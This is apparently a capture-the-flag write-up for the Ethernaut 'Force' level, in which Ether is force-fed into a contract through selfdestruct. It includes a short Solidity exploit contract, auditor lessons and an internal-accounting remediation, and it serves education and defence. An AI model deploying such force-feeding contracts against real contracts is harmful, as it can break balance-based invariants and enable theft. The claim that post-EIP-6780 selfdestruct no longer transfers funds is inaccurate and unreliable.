---
title: 'Ethernaut - Force'
description: 'Forcibly sending Ether to a contract with no receive or fallback functions. Learn how the selfdestruct EVM instruction overrides standard payment controls.'
date: 2025-07-07
tags: ['solidity', 'security', 'selfdestruct', 'ether-forcing', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🪓 Force - The Forced Payment

## Challenge Overview

The objective of this level is to make the balance of the `Force` contract **greater than 0**.

**The Catch:** The `Force` contract is completely empty and has no payable functions, no `receive()`, and no `fallback()`. Attempting to send a standard transaction containing Ether to this contract will instantly fail and revert.

---

## Technical Analysis

### Vulnerability: EVM-Forced Payments via `selfdestruct`

The `Force` contract is declared as:

```solidity
contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

#### The Root Cause
A common misconception in Solidity is that a contract can only receive Ether if it declares explicit `payable` functions or a payment handler (`receive`/`fallback`). 

However, there are three primary ways to force-feed Ether to a contract, bypassing all payment checks and code execution entirely:
1. **`selfdestruct`**: The EVM instruction `selfdestruct(recipient)` destroys the calling contract and transfers all of its remaining Ether balance directly to the designated recipient. The recipient contract has **no way to reject** this transfer, even if it is completely empty.
2. **Coinbase transactions**: A validator/miner can specify the target contract as the recipient of block rewards.
3. **Pre-funding**: We can calculate a contract's future deployment address (via `CREATE` or `CREATE2`) and send Ether to that address before the contract is actually deployed.

For this level, deploying an intermediate contract and calling `selfdestruct` targeting the `Force` contract is the most straightforward method.

---

## The Exploit: The Multi-Step Solution

1. **Deploy an Attack Contract**: Deploy a simple contract containing a payable function or constructor.
2. **Fund the Attack Contract**: Send some Ether (e.g., `1 wei`) during or after deployment.
3. **Trigger Self-Destruct**: Call a function in the attack contract that executes `selfdestruct(payable(forceAddress))`.
4. **Target Balance Increases**: The attack contract is deleted, and its balance is forcibly sent to `Force`.

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    constructor(address payable _target) payable {
        // Must send at least 1 wei to this constructor when deploying
        require(msg.value > 0, "Need Ether to force-feed");
        
        // Destroy this contract and force-feed the target
        selfdestruct(_target);
    }
}
```

To run this, simply deploy `ForceAttacker` through Remix, passing the `Force` contract address as the constructor parameter, and send `1 wei` along with the deployment transaction.

---

## Auditor's Lessons

1. **Never Rely on `address(this).balance` for Invariant Accounting**: Since an attacker can force-feed Ether to your contract at any time, never write critical logic or invariants that assume the contract's balance matches only funds received through standard payable functions (e.g., `require(address(this).balance == totalShares)`).
2. **Internal Accounting Over Global State**: Use internal state variables (like `uint256 public depositedFunds`) to track standard user deposits rather than relying on the contract's actual Ether balance.
3. **Selfdestruct Deprecation**: Be aware that in modern Ethereum upgrades (e.g., Dencun, Cancun EIP-6780), the behavior of `selfdestruct` has changed. It now only transfers funds if the contract was created in the same transaction, but the general vulnerability of pre-funding and block rewards remains.

---

## Remediation

Design contracts to use internal ledger systems rather than checking global balances:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureAccounting {
    // Track internal deposits explicitly
    uint256 public totalDeposits;
    mapping(address => uint256) public userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    // Do NOT use address(this).balance for accounting or calculation
    function withdraw(uint256 _amount) external {
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");
        userBalances[msg.sender] -= _amount;
        totalDeposits -= _amount;
        payable(msg.sender).transfer(_amount);
    }
}
```
